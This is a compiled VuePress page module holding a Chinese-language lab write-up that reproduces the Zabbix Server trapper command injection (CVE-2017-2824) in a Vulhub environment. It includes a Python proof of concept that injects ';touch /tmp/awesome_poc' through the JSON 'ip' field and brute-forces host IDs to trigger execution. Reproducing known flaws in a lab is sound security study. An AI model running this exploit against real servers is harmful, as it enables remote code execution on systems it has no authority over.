import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o as p,c as o,a as n,b as s,d as c,e as i}from"./app-58e4a7d6.js";const u={},l=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"Zabbix 是由Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。其Server端 trapper command 功能存在一处代码执行漏洞，特定的数据包可造成命令注入，进而远程执行代码。攻击者可以从一个Zabbix proxy发起请求，从而触发漏洞。",-1),d=n("p",null,"参考链接：",-1),k={href:"https://talosintelligence.com/reports/TALOS-2017-0325",target:"_blank",rel:"noopener noreferrer"},b=i(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个完整的Zabbix环境，包含Web端、Server端、1个Agent和Mysql数据库：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>命令执行后，执行<code>docker-compose ps</code>查看容器是否全部成功启动，如果没有，可以尝试重新执行<code>docker-compose up -d</code>。</p><p>利用该漏洞，需要你服务端开启了自动注册功能，所以我们先以管理员的身份开启自动注册功能。访问<code>http://your-ip:8080/index.php</code>，使用账号密码<code>admin/zabbix</code>登录后台，进入Configuration-&gt;Actions，将Event source调整为Auto registration，然后点击Create action，创建一个Action，名字随意：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022343242.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>第三个标签页，创建一个Operation，type是“Add Host”：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022344809.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>保存。这样就开启了自动注册功能，攻击者可以将自己的服务器注册为Agent。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>使用这个简单的POC来复现漏洞：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> json
<span class="token keyword">import</span> sys


<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    conn <span class="token operator">=</span> socket<span class="token punctuation">.</span>create_connection<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">10051</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


target <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>send<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">&quot;request&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;active checks&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;host&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;vulhub&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;ip&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;;touch /tmp/awesome_poc&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span> <span class="token number">10500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> send<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">&quot;request&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;command&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;scriptid&quot;</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&quot;hostid&quot;</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> data <span class="token keyword">and</span> <span class="token string">b&#39;failed&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;hostid: %d&#39;</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查看到如下结果时，则说明命令执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203031525035.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入server容器，可见<code>/tmp/awesome_poc</code>已成功创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203031519873.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16);function m(v,g){const a=e("ExternalLinkIcon");return p(),o("div",null,[l,r,d,n("ul",null,[n("li",null,[n("a",k,[s("https://talosintelligence.com/reports/TALOS-2017-0325"),c(a)])])]),b])}const f=t(u,[["render",m],["__file","Zabbix Server trapper命令注入漏洞 CVE-2017-2824.html.vue"]]);export{f as default};
